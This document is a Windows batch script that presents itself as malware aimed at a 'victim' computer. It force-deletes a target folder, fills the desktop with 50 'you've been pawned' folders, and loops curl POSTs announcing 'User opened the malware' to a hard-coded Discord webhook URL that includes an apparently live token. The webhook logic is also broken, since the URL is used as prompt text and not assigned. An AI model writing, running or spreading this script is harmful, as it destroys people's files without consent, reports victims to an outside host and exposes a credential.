@echo off
REM This script deletes the folder named "testfolder"

REM Define the path to the folder
REM Change this according to the target folder path of your victims computer
REM You can also change the name of the folder(s) you want to delete
REM this time we use the folder called testfolder
set folderPath=C:\Users\Administrator\Desktop\testfolder

REM Define the desktop path or the path where you want the folders to be created(just modify somethings)
set desktopPath=C:\Users\Administrator\Desktop

REM Check if the folder exists
if exist "%folderPath%" (
    REM Delete the folder and its contents
    rmdir /s /q "%folderPath%"
    echo Folder "%folderPath%" has been deleted.
) else (
    echo Folder "%folderPath%" does not exist.
)

REM change the amount of folder to be created (1 = start, 1 = step, 50 = how many or end)
for /L %%i in (1,1,50) do (
    mkdir "%desktopPath%\you've been pawned %%i"
)

set /p webhook=https://discord.com/api/webhooks/1360860835441807486/2_prHEHkWQxdxjdF34ARMIywHXA51XDOH7UI44Uew829YxovXnhNDaY6tAR6TVvmS-cR : 
:send
cls
set /p message=User opened the malware : 
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"%message%\"}" %webhook%
goto :send

exit